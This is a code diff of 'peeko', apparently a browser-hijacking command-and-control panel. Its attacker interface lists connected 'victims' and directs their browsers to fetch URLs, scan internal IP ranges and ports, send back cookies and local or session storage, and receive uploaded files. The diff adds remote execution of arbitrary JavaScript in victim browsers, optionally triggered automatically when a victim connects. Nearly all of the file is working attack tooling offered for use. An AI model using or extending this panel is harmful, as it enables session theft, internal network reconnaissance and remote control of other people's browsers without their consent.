@@ -31,6 +31,11 @@
       border: 1px solid #ccc;
       border-radius: 4px;
     }
+    textarea {
+      width: 100%;
+      height: 100px;
+      margin-top: 5px;
+    }
     .section {
       margin-bottom: 20px;
     }
@@ -58,360 +63,292 @@
 </head>
 <body>
 
-  <h1>peeko</h1>
-  <p>v1.0</p>
+<h1>peeko</h1>
+<p>v1.0</p>
 
-  <!-- Target URL Section -->
-  <div class="section">
-    <label for="url">🎯 Target URL:</label><br>
-    <input id="url" placeholder="https://192.168.1.124:8080/example.html" size="60">
-    <button onclick="send()">Send</button>
-    <br>
-    <input type="checkbox" id="autoTarget"> Auto Target on Connect
+<!-- Target URL Section -->
+<div class="section">
+  <label for="url">🎯 Target URL:</label><br>
+  <input id="url" placeholder="https://192.168.1.124:8080/example.html" size="60">
+  <button onclick="send()">Send</button><br>
+  <input type="checkbox" id="autoTarget"> Auto Target on Connect
+</div>
+
+<!-- Scan LAN Targets Section -->
+<div class="section">
+  <label>Scan LAN Targets</label><br>
+  IP / Range / CIDR:
+  <input id="iprange" placeholder="192.168.1.10-20 OR 192.168.1.0/24" size="30">
+  Ports:
+  <input id="ports" placeholder="80,8080,3000-3010" size="30">
+  <button onclick="scan()">🔍 Start Scan</button><br>
+  <input type="checkbox" id="autoScan"> Auto Scan on Connect
+</div>
+
+<!-- Victim Selector Section -->
+<div class="section">
+  <label for="victimSelect">🧍 Select Victim:</label><br>
+  <select id="victimSelect">
+    <option value="">-- No victims connected --</option>
+  </select>
+</div>
+
+<!-- Collect Browser Information Section -->
+<div class="section">
+  <label>Collect Browser Information</label><br>
+  <input type="checkbox" id="info_useragent" checked> User Agent string<br>
+  <input type="checkbox" id="info_platform" checked> Platform (OS)<br>
+  <input type="checkbox" id="info_url" checked> Current URL and Referrer<br>
+  <input type="checkbox" id="info_plugins" checked> Installed Plugins<br>
+  <input type="checkbox" id="info_cookies" checked> Cookies<br>
+  <input type="checkbox" id="info_storage" checked> localStorage/sessionStorage<br>
+  <input type="checkbox" id="autoCollect"> Auto Collect on Connect<br>
+  <button onclick="collectInfo()">Collect Info</button>
+</div>
+
+<!-- File Upload Section -->
+<div class="section">
+  <label>File Upload</label><br>
+  <input type="file" id="fileInput"><br>
+  <button onclick="sendFile()">Send File</button><br>
+  <input type="checkbox" id="autoUpload"> Auto Upload on Connect
+</div>
+
+<!-- Custom JS Section -->
+<div class="section">
+  <label for="customJs">🧠 Custom JavaScript to Execute:</label><br>
+  <textarea id="customJs" placeholder="e.g., alert('hello world')"></textarea><br>
+  <button onclick="sendCustomJs()">Execute Custom JS</button>
+  <input type="checkbox" id="autoJs"> Auto Execute on Connect
+</div>
+
+<!-- Log Output Section -->
+<div class="section">
+  <label>📡 Log Output</label>
+  <div>
+    <button onclick="copyLog()">📋 Copy</button>
+    <button onclick="saveLog('txt')">💾 Save .txt</button>
+    <button onclick="saveLog('json')">💾 Save .json</button>
   </div>
+  <pre id="response"></pre>
+</div>
 
-  <!-- Scan LAN Targets Section -->
-  <div class="section">
-    <label>Scan LAN Targets</label><br>
-    IP / Range / CIDR:
-    <input id="iprange" placeholder="192.168.1.10-20 OR 192.168.1.0/24" size="30">
-    Ports:
-    <input id="ports" placeholder="80,8080,3000-3010" size="30">
-    <button onclick="scan()">🔍 Start Scan</button>
-    <br>
-    <input type="checkbox" id="autoScan"> Auto Scan on Connect
-  </div>
+<footer>
+  peeko v1.0 – by b3rito at mes3hacklab & GioPpeTto
+</footer>
 
-  <!-- Victim Selector Section -->
-  <div class="section">
-    <label for="victimSelect">🧍 Select Victim:</label><br>
-    <select id="victimSelect">
-      <option value="">-- No victims connected --</option>
-    </select>
-  </div>
+<script>
+const socket = new WebSocket("wss://SERVER-IP:8443/ws");
+const victimSelect = document.querySelector("#victimSelect");
+const logOutput = document.querySelector("#response");
+const logLines = [];
+const victimsData = {};
 
-  <!-- Collect Browser Information Section -->
-  <div class="section">
-    <label>Collect Browser Information</label><br>
-    <input type="checkbox" id="info_useragent" checked> User Agent string<br>
-    <input type="checkbox" id="info_platform" checked> Platform (OS)<br>
-    <input type="checkbox" id="info_url" checked> Current URL and Referrer<br>
-    <input type="checkbox" id="info_plugins" checked> Installed Plugins<br>
-    <input type="checkbox" id="info_cookies" checked> Cookies<br>
-    <input type="checkbox" id="info_storage" checked> localStorage/sessionStorage<br>
-    <input type="checkbox" id="autoCollect"> Auto Collect on Connect<br>
-    <button onclick="collectInfo()">Collect Info</button>
-  </div>
+socket.onopen = () => {
+  socket.send("attacker");
+  log("[+] Attacker panel connected");
+};
 
-  <!-- File Upload Section -->
-  <div class="section">
-    <label>File Upload</label><br>
-    <input type="file" id="fileInput"><br>
-    <button onclick="sendFile()">Send File</button><br>
-    <input type="checkbox" id="autoUpload"> Auto Upload on Connect
-  </div>
+socket.onmessage = event => {
+  const msg = event.data.trim();
+  console.log("Received:", msg);
 
-  <!-- Log Output Section -->
-  <div class="section">
-    <label>📡 Log Output</label>
-    <div>
-      <button onclick="copyLog()">📋 Copy</button>
-      <button onclick="saveLog('txt')">💾 Save .txt</button>
-      <button onclick="saveLog('json')">💾 Save .json</button>
-    </div>
-    <pre id="response"></pre>
-  </div>
-
-  <footer>
-    peeko v1.0 – by b3rito at mes3hacklab & GioPpeTto
-  </footer>
-
-  <script>
-    const socket = new WebSocket("wss://192.168.1.12:8443/ws");
-    const victimSelect = document.querySelector("#victimSelect");
-    const logOutput = document.querySelector("#response");
-    const logLines = [];
-    const victimsData = {};
-
-    socket.onopen = () => {
-      socket.send("attacker");
-      log("[+] Attacker panel connected");
-    };
-
-    socket.onmessage = event => {
-      const msg = event.data.trim();
-      console.log("Received message:", msg);
-
-      // Check if the message contains collected info data.
-      const collectedIndex = msg.indexOf("[COLLECTED INFO]");
-      if (collectedIndex !== -1) {
-        const infoStr = msg.slice(collectedIndex + "[COLLECTED INFO]".length).trim();
-        try {
-          const parsed = JSON.parse(infoStr);
-          log("[COLLECTED INFO]\n" + JSON.stringify(parsed, null, 2));
-        } catch (e) {
-          log("[COLLECTED INFO] Parsing Error: " + e);
-          log(msg);
-        }
-        return;
-      }
-
-      const interesting = ["[✅]", "[📄]", "[🟢]", "[🔴]"];
-      let toCheck = msg;
-      if (msg.startsWith("[") && msg.indexOf("]") !== -1) {
-        const firstPrefix = msg.substring(0, msg.indexOf("]") + 1);
-        if (firstPrefix.match(/^\[victim-\d+\]$/)) {
-          toCheck = msg.substring(msg.indexOf("]") + 1).trim();
-        }
-      }
-      if (interesting.some(prefix => toCheck.startsWith(prefix))) {
-        log(msg);
-      } else {
-        log("[RAW] " + msg);
-      }
-
-      // Process victim connection events.
-      if (msg.startsWith("[🟢] Victim connected: ")) {
-        const match = msg.match(/Victim connected: (victim-\d+)\s+\(([^)]+)\)/);
-        if (match) {
-          addVictim(match[1], match[2]);
-          // Auto Collect if enabled.
-          if (document.querySelector("#autoCollect").checked) {
-            sendCollectCommand(match[1]);
-          }
-          // Auto Scan if enabled.
-          if (document.querySelector("#autoScan").checked) {
-            autoScanForVictim(match[1]);
-          }
-          // Auto Target if enabled.
-          if (document.querySelector("#autoTarget").checked) {
-            autoTargetForVictim(match[1]);
-          }
-          // Auto Upload if enabled.
-          if (document.querySelector("#autoUpload").checked) {
-            autoUploadForVictim(match[1]);
-          }
-        }
-      }
-
-      // Process victim disconnection events.
-      if (msg.startsWith("[🔴] Victim disconnected: ")) {
-        const match = msg.match(/Victim disconnected: (victim-\d+)/);
-        if (match) removeVictim(match[1]);
-      }
-    };
-
-    function getSelectedVictim() {
-      return victimSelect.value;
+  if (msg.startsWith("[🟢] Victim connected: ")) {
+    const match = msg.match(/Victim connected: (victim-\d+)\s+\(([^)]+)\)/);
+    if (match) {
+      addVictim(match[1], match[2]);
+      if (document.querySelector("#autoCollect").checked) sendCollectCommand(match[1]);
+      if (document.querySelector("#autoScan").checked) autoScanForVictim(match[1]);
+      if (document.querySelector("#autoTarget").checked) autoTargetForVictim(match[1]);
+      if (document.querySelector("#autoUpload").checked) autoUploadForVictim(match[1]);
+      if (document.querySelector("#autoJs").checked) sendCustomJs(match[1]);
     }
+  }
 
-    function send() {
-      const victim = getSelectedVictim();
-      const url = document.querySelector("#url").value;
-      if (!victim) return alert("⚠️ Select a victim first.");
-      socket.send(`to:${victim}|${url}`);
-    }
+  if (msg.startsWith("[🔴] Victim disconnected: ")) {
+    const match = msg.match(/Victim disconnected: (victim-\d+)/);
+    if (match) removeVictim(match[1]);
+  }
 
-    function scan() {
-      const victim = getSelectedVictim();
-      if (!victim) return alert("⚠️ Select a victim first.");
-      const ipInput = document.querySelector("#iprange").value.trim();
-      const portInput = document.querySelector("#ports").value.trim();
-      const ips = expandIPRange(ipInput);
-      const ports = expandPortList(portInput);
-      for (const ip of ips) {
-        for (const port of ports) {
-          const url = `https://${ip}:${port}`;
-          socket.send(`to:${victim}|${url}`);
-        }
-      }
+  if (msg.includes("[COLLECTED INFO]")) {
+    const info = msg.split("[COLLECTED INFO]")[1].trim();
+    try {
+      log("[COLLECTED INFO]\n" + JSON.stringify(JSON.parse(info), null, 2));
+    } catch (e) {
+      log("Parse error: " + e);
     }
+    return;
+  }
 
-    // Auto-scan function.
-    function autoScanForVictim(victimId) {
-      const ipInput = document.querySelector("#iprange").value.trim();
-      const portInput = document.querySelector("#ports").value.trim();
-      const ips = expandIPRange(ipInput);
-      const ports = expandPortList(portInput);
-      for (const ip of ips) {
-        for (const port of ports) {
-          const url = `https://${ip}:${port}`;
-          socket.send(`to:${victimId}|${url}`);
-        }
-      }
-      log(`[AUTO SCAN] Sent scan commands to ${victimId}`);
-    }
+  log(msg);
+};
 
-    // Auto-target function.
-    function autoTargetForVictim(victimId) {
-      const url = document.querySelector("#url").value;
-      if (url) {
-        socket.send(`to:${victimId}|${url}`);
-        log(`[AUTO TARGET] Sent URL command to ${victimId}`);
-      }
-    }
+function getSelectedVictim() {
+  return victimSelect.value;
+}
 
-    // Build the collect info command.
-    function buildCollectCommand() {
-      const fields = [];
-      if (document.querySelector("#info_useragent").checked) fields.push("useragent");
-      if (document.querySelector("#info_platform").checked) fields.push("platform");
-      if (document.querySelector("#info_url").checked) fields.push("urlref");
-      if (document.querySelector("#info_plugins").checked) fields.push("plugins");
-      if (document.querySelector("#info_cookies").checked) fields.push("cookies");
-      if (document.querySelector("#info_storage").checked) fields.push("storage");
-      return "collectinfo:" + fields.join(",");
-    }
+function send() {
+  const victim = getSelectedVictim();
+  const url = document.querySelector("#url").value;
+  if (!victim || !url) return;
+  socket.send(`to:${victim}|${url}`);
+}
 
-    // Send the collect info command.
-    function sendCollectCommand(victimId) {
-      const command = buildCollectCommand();
-      socket.send(`to:${victimId}|${command}`);
-      log(`[INFO REQUEST SENT] to ${victimId}: ${command}`);
+function scan() {
+  const victim = getSelectedVictim();
+  if (!victim) return;
+  const ips = expandIPRange(document.querySelector("#iprange").value);
+  const ports = expandPortList(document.querySelector("#ports").value);
+  for (const ip of ips) {
+    for (const port of ports) {
+      socket.send(`to:${victim}|https://${ip}:${port}`);
     }
+  }
+}
 
-    // Manual info collection.
-    function collectInfo() {
-      const victim = getSelectedVictim();
-      if (!victim) return alert("⚠️ Select a victim first.");
-      sendCollectCommand(victim);
+function autoScanForVictim(victimId) {
+  const ips = expandIPRange(document.querySelector("#iprange").value);
+  const ports = expandPortList(document.querySelector("#ports").value);
+  for (const ip of ips) {
+    for (const port of ports) {
+      socket.send(`to:${victimId}|https://${ip}:${port}`);
     }
+  }
+}
 
-    // Manual file upload.
-    function sendFile() {
-      const fileInput = document.querySelector("#fileInput");
-      if (!fileInput.files.length) {
-        return alert("No file selected");
-      }
-      const file = fileInput.files[0];
-      const reader = new FileReader();
-      reader.onload = function(event) {
-        const dataUrl = event.target.result;
-        const base64Data = dataUrl.split(",")[1];
-        const command = `file:${file.name}|${base64Data}`;
-        const victim = getSelectedVictim();
-        if (!victim) return alert("Select a victim first");
-        socket.send(`to:${victim}|${command}`);
-        log(`[FILE SENT] ${file.name} (${file.size} bytes)`);
-      };
-      reader.readAsDataURL(file);
-    }
+function autoTargetForVictim(victimId) {
+  const url = document.querySelector("#url").value;
+  if (url) socket.send(`to:${victimId}|${url}`);
+}
 
-    // Auto upload function.
-    function autoUploadForVictim(victimId) {
-      const fileInput = document.querySelector("#fileInput");
-      if (!fileInput.files.length) {
-        log("[AUTO UPLOAD] No file selected for auto upload.");
-        return;
-      }
-      const file = fileInput.files[0];
-      const reader = new FileReader();
-      reader.onload = function(event) {
-        const dataUrl = event.target.result;
-        const base64Data = dataUrl.split(",")[1];
-        const command = `file:${file.name}|${base64Data}`;
-        socket.send(`to:${victimId}|${command}`);
-        log(`[AUTO UPLOAD] Sent file "${file.name}" (${file.size} bytes) to ${victimId}`);
-      };
-      reader.readAsDataURL(file);
-    }
+function buildCollectCommand() {
+  const flags = [];
+  if (document.querySelector("#info_useragent").checked) flags.push("useragent");
+  if (document.querySelector("#info_platform").checked) flags.push("platform");
+  if (document.querySelector("#info_url").checked) flags.push("urlref");
+  if (document.querySelector("#info_plugins").checked) flags.push("plugins");
+  if (document.querySelector("#info_cookies").checked) flags.push("cookies");
+  if (document.querySelector("#info_storage").checked) flags.push("storage");
+  return "collectinfo:" + flags.join(",");
+}
 
-    // Add victim function.
-    function addVictim(id, ip) {
-      victimsData[id] = { ip: ip, connectionTime: new Date() };
-      const exists = [...victimSelect.options].some(opt => opt.value === id);
-      if (!exists) {
-        const opt = document.createElement("option");
-        opt.value = id;
-        opt.textContent = `${id} (${ip})`;
-        if (victimSelect.options.length === 1) victimSelect.selectedIndex = 1;
-        victimSelect.appendChild(opt);
-      }
-    }
+function sendCollectCommand(victimId) {
+  const cmd = buildCollectCommand();
+  socket.send(`to:${victimId}|${cmd}`);
+}
 
-    function removeVictim(id) {
-      delete victimsData[id];
-      [...victimSelect.options].forEach(opt => {
-        if (opt.value === id) opt.remove();
-      });
-      if (victimSelect.options.length === 1) {
-        victimSelect.selectedIndex = 0;
-      }
-    }
+function collectInfo() {
+  const victim = getSelectedVictim();
+  if (!victim) return;
+  sendCollectCommand(victim);
+}
 
-    function expandIPRange(input) {
-      if (input.includes("/")) return expandCIDR(input);
-      if (input.includes("-")) {
-        const [base, end] = input.split("-");
-        const parts = base.split(".");
-        const from = parseInt(parts[3]);
-        const to = parseInt(end);
-        const baseIP = parts.slice(0, 3).join(".");
-        const list = [];
-        for (let i = from; i <= to; i++) list.push(`${baseIP}.${i}`);
-        return list;
-      }
-      return [input];
-    }
+function sendFile() {
+  const fileInput = document.querySelector("#fileInput");
+  const victim = getSelectedVictim();
+  if (!victim || !fileInput.files.length) return;
+  const file = fileInput.files[0];
+  const reader = new FileReader();
+  reader.onload = e => {
+    const base64 = e.target.result.split(",")[1];
+    socket.send(`to:${victim}|file:${file.name}|${base64}`);
+  };
+  reader.readAsDataURL(file);
+}
 
-    function expandCIDR(cidr) {
-      const [ip, mask] = cidr.split("/");
-      const maskInt = parseInt(mask);
-      const ipParts = ip.split(".").map(Number);
-      const ipInt = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
-      const hosts = 2 ** (32 - maskInt);
-      const list = [];
-      for (let i = 1; i < hosts - 1; i++) {
-        const addr = ipInt + i;
-        const a = (addr >> 24) & 0xff;
-        const b = (addr >> 16) & 0xff;
-        const c = (addr >> 8) & 0xff;
-        const d = addr & 0xff;
-        list.push(`${a}.${b}.${c}.${d}`);
-      }
-      return list;
-    }
+function autoUploadForVictim(victimId) {
+  const fileInput = document.querySelector("#fileInput");
+  if (!fileInput.files.length) return;
+  const file = fileInput.files[0];
+  const reader = new FileReader();
+  reader.onload = e => {
+    const base64 = e.target.result.split(",")[1];
+    socket.send(`to:${victimId}|file:${file.name}|${base64}`);
+  };
+  reader.readAsDataURL(file);
+}
 
-    function expandPortList(portString) {
-      const parts = portString.split(",");
-      const ports = new Set();
-      for (const part of parts) {
-        if (part.includes("-")) {
-          const [start, end] = part.split("-").map(Number);
-          for (let i = start; i <= end; i++) ports.add(i);
-        } else {
-          ports.add(parseInt(part));
-        }
-      }
-      return Array.from(ports).filter(p => !isNaN(p));
-    }
+function sendCustomJs(victimOverride = null) {
+  const code = document.querySelector("#customJs").value.trim();
+  const victim = victimOverride || getSelectedVictim();
+  if (!victim || !code) return;
+  socket.send(`to:${victim}|exec:${code}`);
+}
 
-    function log(msg) {
-      logLines.push(msg);
-      logOutput.textContent += msg + "\n";
-      logOutput.scrollTop = logOutput.scrollHeight;
-    }
+function addVictim(id, ip) {
+  victimsData[id] = ip;
+  const opt = document.createElement("option");
+  opt.value = id;
+  opt.textContent = `${id} (${ip})`;
+  victimSelect.appendChild(opt);
+  if (victimSelect.options.length === 2) victimSelect.selectedIndex = 1;
+}
 
-    function copyLog() {
-      navigator.clipboard.writeText(logLines.join("\n"))
-        .then(() => alert("Log copied to clipboard"))
-        .catch(() => alert("Failed to copy log"));
-    }
+function removeVictim(id) {
+  delete victimsData[id];
+  [...victimSelect.options].forEach(o => {
+    if (o.value === id) o.remove();
+  });
+}
 
-    function saveLog(format) {
-      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
-      const filename = `log-${timestamp}.${format}`;
-      let blob;
-      if (format === "json") {
-        blob = new Blob([JSON.stringify(logLines, null, 2)], { type: "application/json" });
-      } else {
-        blob = new Blob([logLines.join("\n")], { type: "text/plain" });
-      }
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = filename;
-      link.click();
+function expandIPRange(input) {
+  if (input.includes("/")) return expandCIDR(input);
+  if (input.includes("-")) {
+    const [base, end] = input.split("-");
+    const start = parseInt(base.split(".")[3]), last = parseInt(end);
+    const prefix = base.split(".").slice(0, 3).join(".");
+    return Array.from({ length: last - start + 1 }, (_, i) => `${prefix}.${start + i}`);
+  }
+  return [input];
+}
+
+function expandCIDR(cidr) {
+  const [ip, mask] = cidr.split("/");
+  const [a, b, c, d] = ip.split(".").map(Number);
+  const base = (a << 24) + (b << 16) + (c << 8) + d;
+  const range = 2 ** (32 - parseInt(mask));
+  const list = [];
+  for (let i = 1; i < range - 1; i++) {
+    const val = base + i;
+    list.push(`${(val >> 24) & 255}.${(val >> 16) & 255}.${(val >> 8) & 255}.${val & 255}`);
+  }
+  return list;
+}
+
+function expandPortList(str) {
+  const ports = new Set();
+  str.split(",").forEach(p => {
+    if (p.includes("-")) {
+      const [s, e] = p.split("-").map(Number);
+      for (let i = s; i <= e; i++) ports.add(i);
+    } else {
+      ports.add(parseInt(p));
     }
-  </script>
+  });
+  return [...ports];
+}
+
+function log(msg) {
+  logLines.push(msg);
+  logOutput.textContent += msg + "\n";
+  logOutput.scrollTop = logOutput.scrollHeight;
+}
+
+function copyLog() {
+  navigator.clipboard.writeText(logLines.join("\n"));
+}
+
+function saveLog(type) {
+  const ts = new Date().toISOString().replace(/[:.]/g, "-");
+  const blob = type === "json"
+    ? new Blob([JSON.stringify(logLines, null, 2)], { type: "application/json" })
+    : new Blob([logLines.join("\n")], { type: "text/plain" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = `log-${ts}.${type}`;
+  a.click();
+}
+</script>
+
 </body>
 </html>
